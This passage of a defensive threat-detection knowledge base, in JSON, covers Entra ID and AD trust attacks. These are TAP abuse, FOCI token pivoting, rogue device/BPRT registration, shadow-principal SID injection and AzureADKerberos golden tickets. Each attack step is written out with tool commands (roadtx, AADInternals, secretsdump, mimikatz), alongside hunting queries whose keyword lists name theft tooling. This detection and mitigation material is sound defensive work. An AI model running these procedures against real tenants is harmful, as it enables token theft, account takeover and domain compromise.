(Category=UserManagement/Authentication Methods), SigninLogs / AADSignInEventsBeta (sign-in that satisfied MFA via the new method), CloudAppEvents (Microsoft Graph activity). On the host side, look for attacker-workstation PowerShell/CLI command lines containing Graph authentication/methods or temporaryAccessPass calls. MDE/MDI provide only supporting endpoint indicators; the cloud audit log is the authoritative source.","events":"Entra Audit: 'Admin registered security info'(管理者が他人へ登録), 'User registered security info'(本人登録), 'Admin updated security info', 'Admin created Temporary Access Pass'(TAP作成), 'User started security info registration'; AuditLogs Category=UserManagement/Authentication Methods; SigninLogs authenticationMethod='Temporary Access Pass'(TAPでサインイン) — ※クラウドイベントのみ発火、対応するWindows Event IDは無し","mitigate":"Minimize Authentication Administrator / Privileged Authentication Administrator assignments and gate elevation through PIM/JIT with approvals. Disable the TAP policy or scope it tightly (one-time use, short lifetime, restricted groups). Enforce phishing-resistant MFA (FIDO2/certificate) for admins to prevent the initial token theft. Use Conditional Access to require a compliant device / trusted location / fresh re-auth for security-info registration. Alert on any auth-method registration or TAP issuance where initiator differs from target. Enable \"Report suspicious activity.\" Periodically inventory registered authentication methods and remove unexpected or unauthorized ones.","triage":"This technique originates in cloud audit logs, not host logs. Black (malicious): an Entra tenant AuditLogs entry with OperationName \"Admin registered security info\" or \"Admin created Temporary Access Pass\" where InitiatedBy.user differs from the TargetResources user (an admin enrolling a method on someone else), executed from an unfamiliar IP/ASN/country, followed within minutes by a SigninLogs ResultType=0 sign-in for the target user from the same or an external IP with a risk level — plus bulk TAP issuance to many targets in a short window. White (benign): a helpdesk/IT admin issuing a TAP for onboarding or assisted SSPR from a corporate IP tied to a ticket, or a user enrolling their own Authenticator/FIDO2 via \"User registered security info\" from a managed device. Adjudicate by correlating InitiatedBy, target, source IP, and the subsequent sign-in.","hunt":[{"plat":"Sentinel","t":"Auth-method registration/TAP where initiator != target","q":"AuditLogs\n| where OperationName in~ (\"Admin registered security info\",\"Admin updated security info\",\"Admin created Temporary Access Pass\",\"Admin updated Temporary Access Pass\",\"User registered security info\")\n| extend Actor = tostring(InitiatedBy.user.userPrincipalName), ActorIp = tostring(InitiatedBy.user.ipAddress)\n| mv-expand TargetResources\n| extend Target = tostring(TargetResources.userPrincipalName)\n| where isnotempty(Actor) and tolower(Actor) != tolower(Target)   // registering a method on someone else's account\n| summarize Targets=dcount(Target), TargetList=make_set(Target,20), Ops=make_set(OperationName,10) by Actor, ActorIp, bin(TimeGenerated,1h)\n| where Targets >= 1\n| sort by Targets desc"},{"plat":"Sentinel","t":"TAP issuance followed by target sign-in within 1h","q":"let taps = AuditLogs\n| where OperationName has \"Temporary Access Pass\"\n| mv-expand TargetResources\n| extend Target = tostring(TargetResources.userPrincipalName), Actor = tostring(InitiatedBy.user.userPrincipalName)\n| project TapTime=TimeGenerated, Target, Actor;\ntaps\n| join kind=inner (SigninLogs | where ResultType == 0 | project TimeGenerated, UserPrincipalName, IPAddress, ConditionalAccessStatus, RiskLevelDuringSignIn) on $left.Target == $right.UserPrincipalName\n| where TimeGenerated between (TapTime .. TapTime + 1h)\n| project TapTime, Target, Actor, SignInTime=TimeGenerated, IPAddress, RiskLevelDuringSignIn, ConditionalAccessStatus\n| sort by TapTime desc"},{"plat":"MDE","t":"Attacker-host PowerShell/CLI running Graph auth-method/TAP calls","q":"DeviceProcessEvents\n| where FileName in~ (\"powershell.exe\",\"pwsh.exe\",\"az.exe\",\"cmd.exe\")\n| where ProcessCommandLine has_any (\"temporaryAccessPass\",\"New-AADIntTAP\",\"Set-AADIntUserMFA\",\"authentication/methods\",\"fido2Methods\",\"New-MgUserAuthentication\",\"phoneMethods\",\"GraphRunner\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| sort by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"Attacker host running Graph auth-method/TAP commands","q":"event_simpleName=ProcessRollup2 (FileName=powershell.exe OR FileName=pwsh.exe OR FileName=az.exe)\n| search CommandLine IN (\"*temporaryAccessPass*\",\"*New-AADIntTAP*\",\"*Set-AADIntUserMFA*\",\"*authentication/methods*\",\"*fido2Methods*\",\"*New-MgUserAuthentication*\",\"*phoneMethods*\")\n| stats count values(CommandLine) as CmdLines by aid, ComputerName, UserName"},{"plat":"Identity Protection","t":"Detect auth-method/TAP anomalies via Falcon Identity Protection","q":"// Falcon EDR does not ingest Entra directory audit logs (cloud-only signal).\n// Use Falcon Identity Protection policy: trigger on Entra 'authentication method registered'\n// or 'Temporary Access Pass created' where actor != target, or anomalous registration source,\n// and enforce a step-up/deny. Pivot to the attacker workstation via the ProcessRollup2 hunt above."}]},{"name":"FOCI Refresh-Token Pivoting (Family of Client IDs)","aka":"FOCI, TokenTactics, roadtx, family refresh token, first-party apps","phase":"trust","group":"クラウド/ハイブリッド (Entra)","mitre":"T1550.001, T1528","cve":"","sev":"Medium","summary":"FOCI (Family of Client IDs) abuses the fact that Microsoft first-party apps share a common \"family\" refresh token: a refresh token stolen for one first-party client (e.g. the Office client) can be redeemed at the token endpoint against a different family client_id (e.g. Azure CLI/Teams), pivoting access laterally and often side-stepping per-app Conditional Access and interactive MFA.","how":"Prerequisites: the attacker already holds one refresh token (RT) for a FOCI-family first-party app (no admin rights). It is obtained via device-code phishing, AiTM phishing, or token-cache theft from a compromised host (WAM/.tbres under %LOCALAPPDATA%\\Microsoft\\TokenBroker, Azure CLI msal_token_cache.bin, Edge/Chrome token stores). Steps: (1) obtain/read the RT with TokenTactics/roadtx/AADInternals. (2) POST to https://login.microsoftonline.com/common/oauth2/v2.0/token with grant_type=refresh_token, refresh_token=<stolen RT>, client_id=<a different family app, e.g. 04b07795-8ddb-461a-bbee-02f9e1bf7b46 (Azure CLI)>, scope=<resource>/.default. Because the RT is family-shared (foci=1), the response returns a fresh access token plus a new RT scoped to the new client_id/resource. e.g. roadtx gettokens --refresh-token <RT> -c azcli -r msgraph, or PowerShell Invoke-RefreshToMSGraphToken/Invoke-RefreshToAzureManagementToken. (3) Use the issued AT against Microsoft Graph / Azure Resource Manager / Exchange Online; if Conditional Access is scoped only per-app, the pivot bypasses it. Core primitive = re-minting tokens across resources/apps by swapping client_id on the family-shared refresh token.","tools":"TokenTactics / TokenTacticsV2, roadtx (ROADtools), AADInternals (Get-AADIntAccessTokenFor*), raw curl/PowerShell (Invoke-RestMethod) against the token endpoint","detect":"The primary telemetry is cloud-side. In Entra ID sign-in logs (especially Non-interactive sign-ins), detect the \"cross-family\" pattern where the same user from the same IP receives tokens for multiple first-party AppIds (Office → Azure CLI → Teams) within a short window. Supporting signals: anomalous User-Agent/ClientAppUsed (e.g. python-requests), datacenter/VPN IPs, RT redemptions with no accompanying interactive auth, risk level (impossible travel), and sudden changes in resourceDisplayName. On the endpoint: process creation of the theft tooling (roadtx/TokenTactics/AADInternals) and read access to token-cache files (.tbres/msal_token_cache.bin). Telemetry sources: AADSignInEventsBeta/SigninLogs (non-interactive), AADInternals detection, Defender for Endpoint process/file events, Identity Protection risk detections.","events":"Entra Non-Interactive SignIn(複数first-party AppId横断), AADSignInEventsBeta(ClientAppUsed異常), 4688(roadtx/TokenTactics/AADInternals実行:窃取ホスト), 4663(トークンキャッシュ.tbres/msal_token_cache.bin読取:要SACL) ※トークン再発行自体はWindows Event/4768等を生成しない","mitigate":"(1) Scope Conditional Access to \"all cloud apps\" so there is no per-app gap (FOCI evades by swapping to a different app). (2) Enforce Token Protection (token binding) so tokens are bound to the device, invalidating replayed RTs. (3) Enable Continuous Access Evaluation (CAE) for near-real-time revocation/risk propagation. (4) On compromise, bulk-revoke RTs with revokeSignInSessions. (5) Restrict/block the device-code flow via Conditional Access. (6) Shorten sign-in frequency / RT lifetime. (7) Require phishing-resistant MFA (FIDO2/cert) and managed/compliant devices. (8) Use Identity Protection risk-based policies to auto-block anomalous sign-ins.","triage":"Black (malicious): in Entra non-interactive sign-in logs, a single user's RT is exchanged for 3+ distinct first-party AppIds within 30 minutes (e.g. d3590ed6…Office → 04b07795…Azure CLI → 1fec8e78…Teams), sourced from one datacenter/VPN IP with a python-requests/roadtx User-Agent and no preceding interactive auth. If the theft host's Security log 4688 shows roadtx.exe/python.exe(roadtx)/TokenTactics PowerShell and 4663 read of .tbres/msal_token_cache.bin (requires SACL) correlate, it is confirmed black. White (benign): from the same managed/compliant device and corporate IP, a user's tokens are reused via SSO across Microsoft apps they actually use (Outlook/Teams/OneDrive); AppIds map to genuinely-used apps, UA is legitimate, device is compliant, ConditionalAccessStatus=success, and there is an interactive sign-in / known device. SSO token reuse across first-party apps is itself normal — the discriminator is the combination of short-window multi-AppId pivoting + non-corporate IP + anomalous UA + absence of interactive auth.","hunt":[{"plat":"MDE","t":"FOCI cross-family token issuance from one user/IP","q":"// One user redeeming tokens for 3+ first-party family apps from one IP in 30 min\nlet fociApps = dynamic([\n  \"d3590ed6-52b3-4102-aeff-aad2292ab01c\", // Office\n  \"04b07795-8ddb-461a-bbee-02f9e1bf7b46\", // Azure CLI\n  \"1950a258-227b-4e31-a9cf-717495945fc2\", // Azure PowerShell\n  \"1fec8e78-bce4-4aaf-ab1b-5451cc387264\", // Teams\n  \"27922004-5251-4030-b22d-91ecd9a37ea4\", // Outlook Mobile\n  \"26a7ee05-5602-4d76-a7ba-eae8b7b67941\"  // OneDrive\n]);\nAADSignInEventsBeta\n| where Timestamp > ago(1d)\n| where ApplicationId in (fociApps)\n| summarize apps=dcount(ApplicationId), appset=make_set(Application), rc=make_set(ResourceDisplayName),\n    first=min(Timestamp), last=max(Timestamp) by AccountUpn, IPAddress, ClientAppUsed\n| where apps >= 3 and datetime_diff('minute', last, first) <= 30\n| order by apps desc"},{"plat":"MDE","t":"Theft tool execution + token-cache access","q":"// roadtx/TokenTactics/AADInternals on host, plus reads of token cache files\nlet toolProc = DeviceProcessEvents\n| where Timestamp > ago(3d)\n| where ProcessCommandLine has_any (\"roadtx\",\"TokenTactics\",\"Invoke-RefreshTo\",\"Get-AADIntAccessToken\",\"foci\",\"refresh_token\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine;\nlet cacheRead = DeviceFileEvents\n| where Timestamp > ago(3d)\n| where FileName =~ \"msal_token_cache.bin\" or FileName endswith \".tbres\" or FolderPath has \"TokenBroker\"\n| where InitiatingProcessFileName in~ (\"python.exe\",\"pwsh.exe\",\"powershell.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, FolderPath, FileName;\ntoolProc | join kind=leftouter (cacheRead) on DeviceName\n| order by Timestamp desc"},{"plat":"Sentinel","t":"Non-interactive sign-in burst across first-party apps","q":"// Sentinel view: same UPN, one IP, many first-party apps, no interactive auth in window\nSigninLogs\n| where TimeGenerated > ago(1d)\n| where ResultType == 0\n| where AppDisplayName has_any (\"Microsoft Office\",\"Azure CLI\",\"Azure PowerShell\",\"Microsoft Teams\",\"Outlook\",\"OneDrive\")\n| summarize apps=dcount(AppDisplayName), appset=make_set(AppDisplayName), clients=make_set(ClientAppUsed),\n    ca=make_set(ConditionalAccessStatus), first=min(TimeGenerated), last=max(TimeGenerated)\n    by UserPrincipalName, IPAddress\n| where apps >= 3 and datetime_diff('minute', last, first) <= 30\n| order by apps desc"}],"huntcs":[{"plat":"Event Search","t":"Token-swap tooling execution on attacker host","q":"event_simpleName=ProcessRollup2 (FileName IN (python.exe,python3.exe,pwsh.exe,powershell.exe)) (CommandLine=*roadtx* OR CommandLine=*TokenTactics* OR CommandLine=*Invoke-RefreshTo* OR CommandLine=*Get-AADIntAccessToken* OR CommandLine=*grant_type=refresh_token* OR CommandLine=*foci*)\n| stats count values(CommandLine) as cmds values(ParentBaseFileName) as parents by aid, ComputerName, UserName, FileName\n| where count > 0"},{"plat":"Identity Protection","t":"Entra token re-mint is invisible to EDR — cover via IdP + host DNS pivot","q":"// FOCI RT->client_id swap happens at login.microsoftonline.com; Falcon EDR does NOT observe the Entra token endpoint exchange.\n// Use Falcon Identity Protection policy for anomalous non-interactive Entra sign-in / service-token replay, and alert on the roadtx/python User-Agent.\n// Endpoint pivot (honest EDR telemetry) — attacker host beaconing to the token endpoint from a scripting engine:\nevent_simpleName=DnsRequest (DomainName=*login.microsoftonline.com* OR DomainName=*login.windows.net*) (ContextBaseFileName IN (python.exe,python3.exe,pwsh.exe,powershell.exe))\n| stats count by aid, ComputerName, ContextBaseFileName, DomainName"}]},{"name":"BPRT / Rogue Device Registration for PRT","aka":"Bulk Primary Refresh Token, rogue device join, device compliance CA","phase":"trust","group":"クラウド/ハイブリッド (Entra)","mitre":"T1098.005, T1550.001","cve":"","sev":"Medium","summary":"A hybrid/cloud technique in which an attacker registers a rogue device into Entra ID using stolen user credentials or a BPRT (bulk enrollment token), obtains that device's Primary Refresh Token (PRT), and thereby gains SSO to all cloud apps and bypasses device-state Conditional Access.","how":"Prerequisites: valid tenant user credentials (or a token) plus the default \"users may register/join devices = All\" with no MFA required at join. Steps: (1) get an AAD-Join access token with AADInternals `Get-AADIntAccessTokenForAADJoin` (Authentication Broker, clientID 29d9ed98-…). (2) For a single device, `Join-AADIntDeviceToAzureAD -DeviceName \"Rogue\" -DeviceType Windows` generates a device cert + transport key and registers the object in Entra. (3) `Get-AADIntUserPRTToken` / `Get-AADIntUserPRTKeys` requests the PRT. BPRT variant: `New-AADIntBulkPRTToken -Name \"pkg\"` mints a bulk enrollment token for a package_<guid> pseudo-user (no MFA, 180-day validity), then `Join-AADIntDeviceToAzureAD -BPRT $bprt` is looped to mass-produce registered devices. roadtx (ROADtools) does the same via `roadtx device -a register` / `roadtx prt`. The key primitive is the PRT + session key, which can mint access tokens for any cloud app and satisfies Conditional Access that only requires \"device registered/joined,\" giving durable persistence.","tools":"AADInternals (Join-AADIntDeviceToAzureAD, New-AADIntBulkPRTToken, Get-AADIntUserPRTToken), ROADtools/roadtx, TokenTactics, dsregcmd.exe, Windows Configuration Designer (WCD)","detect":"The primary signal is cloud telemetry. Entra audit \"Add device\" / \"Add registered owner to device\" firing many times from the same user/IP in a short window. Sign-ins to Device Registration Service / Microsoft Authentication Broker, especially from unfamiliar IPs, countries, or non-managed clients. Appearance of a package_<guid> pseudo-user and its BPRT sign-ins. Growth of \"registered only\" devices with no matching Intune (MDM) enrollment. Post-PRT SSO pattern of token issuance to many cloud apps in a short window. If run from a managed host, execution of dsregcmd.exe/powershell.exe/python (roadtx) and connections to enterpriseregistration.windows.net.","events":"AuditLogs: Add device / Add registered owner to device / Update device (Category: Device), SigninLogs: Device Registration Service / Microsoft Authentication Broker サインイン, 4688(攻撃/管理ホストの dsregcmd.exe・powershell.exe・python/roadtx)","mitigate":"In Entra device settings, restrict \"users may join/register devices\" to specific groups and enable \"require MFA to join/register devices\" (this blocks the MFA-less BPRT issuance and most rogue joins). Lower the maximum devices-per-user limit. Make Conditional Access require Intune compliant / hybrid-joined devices rather than merely \"registered,\" excluding rogue objects. Periodically inventory registered devices and package_<guid> users, delete suspicious objects, and revoke BPRTs. Deploy token protection and phishing-resistant MFA to stop the initial credential theft. Continuously monitor for device-registration spikes.","triage":"Black: Entra audit \"Add device\" from one user (or a package_<guid>) 3+ times per hour, with generic/sequential DeviceNames, an InitiatedBy IP that is foreign/Tor/VPS, and no matching Intune MDM enrollment → BPRT/rogue registration. Sign-in log showing repeated Device Registration Service auth from a non-managed client / new IP, immediately followed by PRT-based token issuance to many apps → malicious. On the attacker host, 4688 with powershell.exe + AADInternals/roadtx strings → confirmed black. White: an employee registering a new PC via Autopilot on corporate Wi-Fi produces a single \"Add device\" correlated with an Intune enrollment (MDM), compliance evaluation, a single device, and a corporate IP → legitimate. A BPRT issued legitimately for IT bulk-imaging is explainable by a change ticket and a managed host running WCD.","hunt":[{"plat":"Entra","t":"Bulk device registration in short window by same actor","q":"AuditLogs\n| where OperationName in (\"Add device\",\"Add registered owner to device\")\n| where Result == \"success\"\n| extend Actor = tostring(InitiatedBy.user.userPrincipalName), ActorIP = tostring(InitiatedBy.user.ipAddress)\n| extend DeviceName = tostring(TargetResources[0].displayName)\n| summarize DeviceCount = dcount(DeviceName), Devices = make_set(DeviceName, 25), IPs = make_set(ActorIP, 10) by Actor, bin(TimeGenerated, 1h)\n| where DeviceCount >= 3\n| order by DeviceCount desc"},{"plat":"Entra","t":"Anomalous sign-ins to Device Registration Service","q":"SigninLogs\n| where AppDisplayName in (\"Device Registration Service\",\"Microsoft Authentication Broker\")\n| where ResultType == 0\n| summarize Auths = count(), IPs = make_set(IPAddress, 10), CAStates = make_set(ConditionalAccessStatus, 5) by UserPrincipalName, bin(TimeGenerated, 1h)\n| where Auths >= 3\n| order by Auths desc"},{"plat":"MDE","t":"AADInternals/roadtx execution on attacker host","q":"DeviceProcessEvents\n| where FileName in~ (\"powershell.exe\",\"pwsh.exe\",\"python.exe\",\"dsregcmd.exe\")\n| where ProcessCommandLine has_any (\"AADInternals\",\"New-AADIntBulkPRTToken\",\"Join-AADIntDeviceToAzureAD\",\"Get-AADIntUserPRTToken\",\"Get-AADIntUserPRTKeys\",\"roadtx\",\"BPRT\",\"AccessTokenForAADJoin\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| order by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"Device-registration tooling on attacker host","q":"event_simpleName=ProcessRollup2 (FileName IN (powershell.exe, pwsh.exe, python.exe, dsregcmd.exe))\n| search CommandLine IN (\"*AADInternals*\",\"*BulkPRTToken*\",\"*Join-AADIntDevice*\",\"*Get-AADIntUserPRT*\",\"*roadtx*\",\"*AccessTokenForAADJoin*\",\"*BPRT*\")\n| stats count by aid, ComputerName, UserName, FileName, CommandLine"},{"plat":"Event Search","t":"Registration-endpoint contact correlated with process","q":"event_simpleName=DnsRequest DomainName=\"enterpriseregistration.windows.net\"\n| stats count values(ContextBaseFileName) as procs by aid, ComputerName, DomainName\n// pivot: ContextBaseFileName が powershell.exe/python.exe 等の非ブラウザなら不正登録の疑い（正規参加は既定でブラウザ/dsregcmd 由来）"}]},{"name":"PAM Trust / Shadow Security Principal Abuse","aka":"MIM PAM, bastion/red forest, msDS-ShadowPrincipal, SID injection","phase":"trust","group":"トラスト/フォレスト間","mitre":"T1134.005, T1484.002","cve":"","sev":"High","summary":"Abuse of the MIM PAM PIM-trust plus Shadow Security Principals (msDS-ShadowPrincipal): an attacker maps a production-forest privileged SID (Enterprise/Domain Admins, etc.) onto a shadow object in the bastion/admin forest so the KDC injects it as SID History at authentication time, yielding cross-forest privilege escalation.","how":"Prereqs: the production forest has the PAM feature enabled (Enable-ADOptionalFeature 'Privileged Access Management Feature') and a one-way incoming PIM trust from the bastion (netdom trust ... /EnableSIDHistory:yes /EnablePIMTrust:yes, FFL 2016+), and the attacker holds write access to CN=Shadow Principal Configuration,CN=Services,CN=Configuration in the bastion/MIM forest (or PAM/MIM admin rights). Steps: (1) New-ADObject creates an object of class msDS-ShadowPrincipal and sets msDS-ShadowPrincipalSid to a production privileged SID (e.g., S-1-5-21-…-519 Enterprise Admins / -512 Domain Admins / -500); (2) Set-ADObject -Add @{'member'=attackerDN} adds the attacker as a member (in MIM the same is done via New-PAMGroup/New-PAMUser/New-PAMRequest); (3) when the attacker authenticates to a production resource, the KDC injects the shadow SID into the TGT's PAC as SID History across the PIM trust. The key primitive is synthesizing the SID at auth time via the shadow object rather than writing sIDHistory onto the account, leaving little trace on the principal itself; the attacker can then DCSync and fully own production Tier-0.","tools":"PowerShell ActiveDirectory module (New-ADObject / Set-ADObject / Enable-ADOptionalFeature), MIM PAM cmdlets (New-PAMGroup / New-PAMUser / New-PAMRequest), netdom.exe (/EnablePIMTrust), ldapmodify, Rubeus/Mimikatz (SID History / PAC inspection), BloodHound (trust enumeration)","detect":"Detection centers on DS-access auditing on the bastion/MIM forest DCs. With SACL auditing, capture object creation under CN=Shadow Principal Configuration (5137) and changes to the msDS-ShadowPrincipalSid / member attributes (5136, 4662), and treat as anomalous any case where the value resolves to a high-privilege SID (-519/-512/-518/-520/-500) or where the change is made by anything other than the MIM service account. Also monitor creation/modification of the PIM/SIDHistory trust (4706/4716). On the production side, correlate cross-realm TGS (4769) issued to shadow-principal members as originating from the PIM trust. Telemetry sources: Windows Security events (DCs), Microsoft Defender for Identity (directory changes / cross-forest authentication), and MIM PAM request logs.","events":"5137(オブジェクト作成), 5136(msDS-ShadowPrincipalSid/member 変更), 4662(ディレクトリ書込), 4769(クロスレルムTGS), 4706/4716(PAM/PIMトラスト作成・変更)","mitigate":"(1) Protect the bastion/MIM/PAM forest as strict Tier-0, equal to production, with separated admins and PAWs. (2) Restrict write access to CN=Shadow Principal Configuration to only the MIM service account, minimize its ACL, and enable SACL auditing (5136/5137). (3) Do not enable the PAM feature or the PIM/SIDHistory trust unless MIM PIM is actually operated—disable if unused. (4) Inventory msDS-ShadowPrincipalSid on all shadow principals and continuously audit for high-privilege SID mappings (-519/-512/-518/-520/-500) and non-expiring (no-TTL) memberships. (5) Reconcile MIM approval/request logs against directory changes to catch unauthorized grants. (6) Combine with authentication policies / SID filtering that constrain cross-forest authentication.","triage":"Black (malicious): on a bastion/MIM forest DC, an identity other than the MIM service account (an interactively logged-on admin or a rogue automation account) runs 5137 (shadow principal created) → 5136 (msDS-ShadowPrincipalSid=…-519 / member added) outside a change window, immediately followed on a production DC by cross-realm 4769 from that member toward a Tier-0 service and replication/DCSync-style access. The give-aways are a high-privilege SID mapping with no TTL and no backing approval record. White (benign): the same 5137/5136 performed by the MIM/PAM service account, matching one-to-one an approved MIM PIM activation request, where msDS-ShadowPrincipalSid points to the group expected by the role definition, the member add carries a TTL, and the corresponding 4769 falls within the approved elevation window. Per the chosen events, 5137/5136/4662 anchor on the bastion DC, 4769 on the production DC, and 4706/4716 correlate only when the trust is (re)configured.","hunt":[{"plat":"Sentinel","t":"Non-MIM writes to the Shadow Principal container","q":"// SACL auditing required on CN=Shadow Principal Configuration\nlet allow = dynamic([\"MIM_PAM$\",\"MIMSvc$\"]); // approved MIM/PAM service accounts\nSecurityEvent\n| where EventID in (5137, 5136)\n| where ObjectName has \"Shadow Principal Configuration\"\n| where SubjectUserName !in~ (allow)\n| summarize Ops=count(), Values=make_set(MemberName, 25), EventIDs=make_set(EventID) by Computer, SubjectUserName, ObjectName, bin(TimeGenerated, 1h)\n| where Ops > 0\n| sort by Ops desc"},{"plat":"MDE","t":"Processes manipulating shadow principals / PAM feature","q":"DeviceProcessEvents\n| where ProcessCommandLine has_any (\"msDS-ShadowPrincipal\",\"Shadow Principal Configuration\",\"New-PAMGroup\",\"New-PAMUser\",\"Privileged Access Management Feature\",\"EnablePIMTrust\")\n| where InitiatingProcessFileName in~ (\"powershell.exe\",\"pwsh.exe\",\"cmd.exe\",\"netdom.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine\n| sort by Timestamp desc"},{"plat":"Sentinel","t":"Creation/modification of a PAM/PIM (SIDHistory) trust","q":"SecurityEvent\n| where EventID in (4706, 4716) // new / modified trust\n| project TimeGenerated, Computer, SubjectUserName, TrustedDomain=TargetUserName, EventID\n| summarize Changes=count() by Computer, SubjectUserName, TrustedDomain, EventID, bin(TimeGenerated, 1d)\n| sort by Changes desc"}],"huntcs":[{"plat":"Event Search","t":"Process manipulating shadow principals / PAM trust","q":"event_simpleName=ProcessRollup2 (CommandLine=*msDS-ShadowPrincipal* OR CommandLine=*Shadow Principal Configuration* OR CommandLine=*New-PAMGroup* OR CommandLine=*New-PAMRequest* OR CommandLine=*EnablePIMTrust* OR CommandLine=*Privileged Access Management Feature*)\n| stats count by aid, ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"Monitor cross-forest privileged auth / SID History (DC write is out of EDR scope)","q":"// Falcon EDR does not parse DC LDAP writes to CN=Shadow Principal Configuration nor PAC SID-History injection.\n// Use CrowdStrike Falcon Identity Protection: alert on anomalous cross-domain/cross-forest privileged logon originating from the bastion(PAM) forest into production Tier-0, and on newly appearing SID-History on privileged authentications."}]},{"name":"Entra Cloud Kerberos Trust Ticket Forgery (WHfB Cloud Trust)","aka":"AzureADKerberos, cloud trust, partial TGT, Windows Hello for Business","phase":"trust","group":"クラウド/ハイブリッド (Entra)","mitre":"T1558, T1649","cve":"","sev":"High","summary":"Entra ID Kerberos (WHfB cloud trust) provisions an RODC-style computer object \"AzureADKerberos$\" (krbtgt/AzureAD) in on-prem AD whose key signs the partial TGTs that Entra ID issues and on-prem DCs upgrade; stealing that AES256 key lets an attacker forge on-prem golden TGTs impersonating any user, enabling privileged access and lateral movement across on-prem AD — a high-impact hybrid-trust bridge. (The forged ticket is Kerberos and by itself does not authenticate to cloud/Entra APIs.)","how":"Two privilege paths. (A) On-prem: with Domain Admin or the Replicating Directory Changes right, DCSync the AES256 key of AzureADKerberos$ (krbtgt/AzureAD) — e.g. secretsdump.py -just-dc-user 'AzureADKerberos$' corp/da@dc, or DSInternals. (B) Cloud/hybrid: a Global/Hybrid Identity Administrator can create, inspect, or rotate the Kerberos server object via the AzureADHybridAuthenticationManagement module (Get-/Set-AzureADKerberosServer) — but the raw AES256 key resides in the on-prem AzureADKerberos$ object, so actual key recovery still requires on-prem replication access. The core primitive is that AzureADKerberos$ is effectively a krbtgt whose AES256 key produces (partial) TGTs that on-prem DCs trust and upgrade. With the key, Rubeus golden or mimikatz kerberos::golden (supplying the AzureADKerberos key + domain SID + RODC key number) forges an offline golden TGT for any user (e.g. Administrator), then requests service tickets (TGS-REQ) to privileged SPNs. roadtx (ROADtools) can replay/abuse the legitimate Entra Kerberos partial-TGT request flow. Forging with AES256 (not RC4) evades encryption-downgrade detection.","tools":"AzureADHybridAuthenticationManagement (Get-/Set-AzureADKerberosServer), roadtx (ROADtools), Rubeus, mimikatz (kerberos::golden), Impacket secretsdump.py, DSInternals","detect":"The primary key-theft signal is 4662/replication (Replicating Directory Changes) on a DC — especially access to the AzureADKerberos object or replication sourced from a non-DC principal. Forged-TGT use surfaces as 4769 TGS-REQ with no preceding 4768 (AS-REQ), or an RC4 (TicketEncryptionType 0x17) downgrade in an AES-only WHfB tenant. Corresponds to MDI \"Suspected DCSync attack\" and \"Suspected Golden Ticket usage\" (encryption-downgrade / time / nonexistent-account anomalies). The key correlation is whether each on-prem Kerberos issuance has a matching Entra WHfB interactive sign-in (SigninLogs / AADSignInEventsBeta). On hosts, catch Rubeus/mimikatz/secretsdump or AzureADHybridAuthenticationManagement command lines via MDE DeviceProcessEvents. Telemetry: DC Security log (4662/4768/4769), MDI, Entra SigninLogs/AuditLogs, MDE process events.","events":"4662(AzureADKerberosオブジェクトのレプリケーション/DCSync), 4769(偽造TGTでのTGS-REQ・先行4768なし/RC4ダウングレード0x17), 4768(正規クラウド信頼サインイン時のTGT発行=相関白), 4741(AzureADKerberos$コンピュータオブジェクト作成)","mitigate":"Treat AzureADKerberos$ as a krbtgt-tier crown-jewel: minimize and audit principals holding Replicating Directory Changes/All. Enforce AES256 on DCs and disable RC4. Keep Global/Hybrid Identity Administrator counts minimal, gate them with PIM (time-bound, approval), and require phishing-resistant MFA + Conditional Access on privileged accounts. Rotate the Azure AD Kerberos server key regularly (Set-AzureADKerberosServer -RotateServerKey) and immediately (twice, as with krbtgt) on suspected compromise. Operationalize MDI \"Suspected DCSync\"/\"Golden Ticket\" alerts and correlate on-prem Kerberos issuance against the absence of a matching Entra WHfB sign-in. Isolate Tier 0, and enable credential protections (Credential Guard, ASR LSASS protection) on DCs and admin hosts.","triage":"Black (malicious): On a DC, Security 4662 shows Replicating Directory Changes against the AzureADKerberos (krbtgt/AzureAD) object sourced from a member host or user context (not a DC); the same host's MDE DeviceProcessEvents runs secretsdump/Rubeus/mimikatz; then the DC logs 4769 TGS-REQ to privileged SPNs with no preceding 4768 and RC4 (0x17), while the target user has no WHfB interactive sign-in in Entra SigninLogs. MDI chains \"Suspected DCSync\" + \"Suspected Golden Ticket.\" Steal→forge→use links the same actor in one window = black. White (benign): A genuine WHfB cloud-trust logon has a matching interactive WHfB sign-in in Entra SigninLogs from the user's registered device at the same time, the DC's 4768 is AES256, and there is no non-DC-sourced replication event. Onboarding-time server-object creation/key rotation by a Domain Admin via AzureADHybridAuthenticationManagement (4741 / object change) from a Tier 0 admin host is white when it matches planned change work.","hunt":[{"plat":"MDI","t":"Directory replication by a non-DC account (DCSync of the AzureADKerberos key)","q":"IdentityDirectoryEvents\n| where ActionType == \"Directory Services replication\"\n| where AccountName !endswith \"$\"   // legitimate replication is DC machine accounts; user-context replication = DCSync\n| summarize Replications=count(), Targets=make_set(TargetDeviceName,10), IPs=make_set(IPAddress,5) by AccountName, AccountUpn, bin(Timestamp, 10m)\n| where Replications >= 1\n| sort by Replications desc"},{"plat":"Sentinel","t":"TGS-REQ with no preceding AS-REQ / RC4 downgrade (golden TGT use)","q":"let lookback = 24h;\nlet AsReq = SecurityEvent\n    | where TimeGenerated > ago(lookback)\n    | where EventID == 4768\n    | project AsUser=TargetUserName, AsTime=TimeGenerated;\nSecurityEvent\n| where TimeGenerated > ago(lookback)\n| where EventID == 4769\n| where TargetUserName !endswith \"$\"\n| join kind=leftouter AsReq on $left.TargetUserName == $right.AsUser\n| where isnull(AsTime) or AsTime > TimeGenerated      // service ticket with no prior TGT issuance\n| extend Rc4Downgrade = (TicketEncryptionType == \"0x17\")   // RC4 in an AES WHfB tenant\n| project TimeGenerated, Computer, TargetUserName, ServiceName, IpAddress, TicketEncryptionType, Rc4Downgrade\n| order by TimeGenerated desc"},{"plat":"MDE","t":"Key-theft / TGT-forgery tooling on hosts","q":"DeviceProcessEvents\n| where ProcessCommandLine has_any (\"AzureADKerberosServer\",\"AzureADHybridAuthenticationManagement\",\"kerberos::golden\",\"-just-dc-user\",\"roadtx\")\n   or FileName 